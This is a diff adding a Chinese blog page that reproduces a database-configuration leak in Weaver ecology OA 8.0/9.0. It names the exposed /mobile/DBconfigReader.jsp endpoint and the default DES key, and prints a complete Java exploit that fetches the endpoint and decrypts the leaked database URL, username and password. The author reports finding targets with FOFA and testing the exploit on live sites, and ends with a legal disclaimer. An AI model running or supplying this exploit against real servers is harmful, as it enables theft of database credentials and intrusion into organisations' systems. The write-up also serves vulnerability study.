@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>【漏洞复现】泛微ecology OA系统某接口存在数据库配置信息泄露漏洞 - 像清水一般清澈透明</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="清水Samny,"> 
+    <meta name="description" content="目前 &amp;nbsp; &amp;nbsp;  0x00 前言&amp;nbsp; &amp;nbsp;   0x01 漏洞简诉&amp;nbsp; &amp;nbsp;  0x02 漏洞分析&amp;nbsp; &amp;nbsp;  0x03 漏洞剖析&amp;,"> 
+    <meta name="author" content="Samny"> 
+    <link rel="alternative" href="atom.xml" title="像清水一般清澈透明" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">像清水一般清澈透明</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">【漏洞复现】泛微ecology OA系统某接口存在数据库配置信息泄露漏洞</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">【漏洞复现】泛微ecology OA系统某接口存在数据库配置信息泄露漏洞</h1>
+        <div class="stuff">
+            <span>十月 26, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p><a href="#1">目前</a><br> &nbsp; &nbsp; <a href="#0x00"> 0x00 前言</a><br>&nbsp; &nbsp;  <a href="#0x01"> 0x01 漏洞简诉</a><br>&nbsp; &nbsp; <a href="#0x02"> 0x02 漏洞分析</a><br>&nbsp; &nbsp; <a href="#0x03"> 0x03 漏洞剖析</a><br>&nbsp; &nbsp; <a href="#0x04"> 0x04 漏洞复现</a><br>&nbsp; &nbsp; <a href="#0x05"> 0x05 复现那些泪水</a><br>&nbsp; &nbsp; <a href="#0x06"> 0x06 复现总结</a><br>&nbsp; &nbsp;<a href="#0x07"> 0x07 免责声明</a></p>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>漏洞被曝光有几天时间了。一直在上课没有时间写，昨天晚上整了一晚上，加上今天下午和学长搞了一下午才复现成功！<br>经过这次我意识到了会开发的重要性，我前前后后问了一堆人，百度了一堆问题！最后发现会开发能解决这一切问题！</p>
+<p>各位看官且看下文分析！</p>
+<hr>
+<h1 id="0x01-漏洞简诉"><a href="#0x01-漏洞简诉" class="headerlink" title="0x01 漏洞简诉"></a>0x01 漏洞简诉</h1><p>漏洞涉及范围，用fofa搜索，看影响范围，还挺大的！</p>
+<p>影响版本：包括不限于8.0、9.0版<br><img src="https://img-blog.csdnimg.cn/20191026195236165.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>分析看源码[1]分析，sb字符串是url、user、password和logintype组成！<br>然后str是sb的字符串转成字节，（重点！！！）keyString是1z2x3c4v5b6n 。<br>keyByte是keyString转成字节而来！<br>dsk1 是 DESkeySpec 类对象。<br>接下去都是加密的过程！（说实话我现在还有点迷）<br><img src="https://img-blog.csdnimg.cn/20191026201547385.png" alt="在这里插入图片描述"></p>
+<hr>
+<p>经过上面一系列的操作，然后我访问使用payload访问目标站点，会看到是一堆由DES加密的乱码！<br><img src="https://img-blog.csdnimg.cn/20191026203344957.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="0x03-漏洞剖析"><a href="#0x03-漏洞剖析" class="headerlink" title="0x03 漏洞剖析"></a>0x03 漏洞剖析</h1><p>经过一系列的分析，不难发现利用这漏洞只要掌握两个要点！</p>
+<ol>
+<li><p>获取密钥，这点看不到源码的话是根本不可能实现的。但是我们可以根据上面源码默认密钥1z2x3c4v5b6n。</p>
+</li>
+<li><p>使用密钥解密DES密文！这个得去看看java如何实现DES加密解密算法，还要研究透DES算法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解密实现 源码来着https://www.cnblogs.com/itrena/p/9081056.html</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> src byte[]</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> password String</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> byte[]</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] src, String password) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">          <span class="comment">// DES算法要求有一个可信任的随机数源</span></span><br><span class="line">          SecureRandom random = <span class="keyword">new</span> SecureRandom();</span><br><span class="line">          <span class="comment">// 创建一个DESKeySpec对象</span></span><br><span class="line">          DESKeySpec desKey = <span class="keyword">new</span> DESKeySpec(password.getBytes());</span><br><span class="line">          <span class="comment">// 创建一个密匙工厂</span></span><br><span class="line">          SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">          <span class="comment">// 将DESKeySpec对象转换成SecretKey对象</span></span><br><span class="line">          SecretKey securekey = keyFactory.generateSecret(desKey);</span><br><span class="line">          <span class="comment">// Cipher对象实际完成解密操作</span></span><br><span class="line">          Cipher cipher = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">          <span class="comment">// 用密匙初始化Cipher对象</span></span><br><span class="line">          cipher.init(Cipher.DECRYPT_MODE, securekey, random);</span><br><span class="line">          <span class="comment">// 真正开始解密操作</span></span><br><span class="line">          <span class="keyword">return</span> cipher.doFinal(src);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h1 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h1><p>昨天晚上经过大量实践分析，咨询之后！我还是失败了。<br>今天早上起来已经是中午。<br>像往常一样打开微信QQ看看亲友群[2]、朋友圈、QQ空间！<br>当我看到我这个漏洞圈子社区17小时之前有人已经发了exp[3]。我就迫不及待的去试试了！</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpGet;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.HttpClientBuilder;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.util.EntityUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadDbConfig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String DES = <span class="string">"DES"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String key = <span class="string">"1z2x3c4v5b6n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args[<span class="number">0</span>]!=<span class="keyword">null</span>&amp;&amp; args[<span class="number">0</span>].length() !=<span class="number">0</span>)&#123;</span><br><span class="line">            String url = args[<span class="number">0</span>]+<span class="string">"/mobile/DBconfigReader.jsp"</span>;</span><br><span class="line">            System.out.println(ReadConfig(url));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.err.print(<span class="string">"use: java -jar ecologyExp  http://127.0.0.1"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">ReadConfig</span><span class="params">(String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        CloseableHttpClient httpClient = HttpClientBuilder.create().build();</span><br><span class="line">        HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">        CloseableHttpResponse response = httpClient.execute(httpGet);</span><br><span class="line">        HttpEntity responseEntity = response.getEntity();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] res1 = EntityUtils.toByteArray(responseEntity);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = subBytes(res1,<span class="number">10</span>,res1.length-<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span> [] finaldata =decrypt(data,key.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> String(finaldata));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] data, <span class="keyword">byte</span>[] key) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        SecureRandom sr = <span class="keyword">new</span> SecureRandom();</span><br><span class="line">        DESKeySpec dks = <span class="keyword">new</span> DESKeySpec(key);</span><br><span class="line">        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);</span><br><span class="line">        SecretKey securekey = keyFactory.generateSecret(dks);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(DES);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cipher.doFinal(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] subBytes(<span class="keyword">byte</span>[] src, <span class="keyword">int</span> begin, <span class="keyword">int</span> count) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bs = <span class="keyword">new</span> <span class="keyword">byte</span>[count];</span><br><span class="line">        System.arraycopy(src, begin, bs, <span class="number">0</span>, count);</span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 看完之后，有点惊喜又有点失落。惊喜的是有完整的源码，但是没有jar。<br> 这个让我一个java菜鸟如何是好！我在求助了一个热心做开发的学长之后，经过我们不断试错！不断debug，终于完成了！<br> <img src="https://img-blog.csdnimg.cn/20191026205714833.png" alt="在这里插入图片描述"></p>
+<h1 id="0x05-复现那些泪水"><a href="#0x05-复现那些泪水" class="headerlink" title="0x05 复现那些泪水"></a>0x05 复现那些泪水</h1><p>  千辛万苦解决一切bug之后首先遇见第一道坑！<br> <img src="https://img-blog.csdnimg.cn/20191026205813512.png" alt="在这里插入图片描述"></p>
+<hr>
+<p>第二道坑！<br> <img src="https://img-blog.csdnimg.cn/20191026210010365.png" alt="在这里插入图片描述"></p>
+<h2 id><a href="#" class="headerlink" title=" "></a> <img src="https://img-blog.csdnimg.cn/2019102621010238.png" alt="在这里插入图片描述"></h2><p> 第三个坑！<br> 这个坑是这个网站使用不同的密钥导致的！（也就是密钥不是1z2x3c4v5b6n）</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> <img src="https://img-blog.csdnimg.cn/20191026210143314.png" alt="在这里插入图片描述"></h2><h1 id="0x06-复现总结"><a href="#0x06-复现总结" class="headerlink" title="0x06 复现总结"></a>0x06 复现总结</h1><ol>
+<li>开发经验不足</li>
+<li>接触太少加密算法</li>
+<li>有一个开发朋友很重要</li>
+<li>我的安全之路还有很长的路要走</li>
+</ol>
+<hr>
+<h1 id="0x07-免责声明"><a href="#0x07-免责声明" class="headerlink" title="0x07 免责声明"></a>0x07 免责声明</h1><p>没有放出jar文件是因为最新安全发的缘故。请遵守《网络安全法》等相关法律法规。</p>
+<hr>
+<p>[1]源码来着360CET公共号：<a href="https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg</a><br>[2]亲友群：就是安全群。在不同安全群常常能见到很多相同的人，所以被称为亲友群。<br>[3]exp源码来着：<a href="https://www.secquan.org/BugWarning/1070442" target="_blank" rel="noopener">https://www.secquan.org/BugWarning/1070442</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/574566207.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='a69212da3fc88cd39af9'
+        data-cs='19e2c5d71620cb7b14d99a908f8134be70bd83fa'
+        data-r='gittalksamny'
+        data-o='samny520'
+        data-a='samny520'
+        data-d='true'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞简诉"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞简诉</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-漏洞剖析"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞剖析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-漏洞复现"><span class="toc-number">5.</span> <span class="toc-text">0x04 漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-复现那些泪水"><span class="toc-number">6.</span> <span class="toc-text">0x05 复现那些泪水</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">6.1.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-1"><span class="toc-number">6.2.</span> <span class="toc-text"> </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-复现总结"><span class="toc-number">7.</span> <span class="toc-text">0x06 复现总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-免责声明"><span class="toc-number">8.</span> <span class="toc-text">0x07 免责声明</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/js/test.js"></script>
+<script src="/js/tx.js"></script>
+<script src="/js/x.js"></script>
+<script src="/js/xiantiao.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- 在想要使用窗口小部件的地方插入该标签 -->
+<iframe width="900" height="401" src="https://cybermap.kaspersky.com/cn/widget/dynamic/dark" frameborder="0">
+
+
+<script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5jbaycl6wsf&amp;m=7&amp;c=e63100&amp;cr1=ffffff&amp;f=arial&amp;l=0&amp;bv=90&amp;lx=-420&amp;ly=420&amp;hi=20&amp;he=7&amp;hc=a8ddff&amp;rs=80" async="async"></script>
+
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '218065278', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
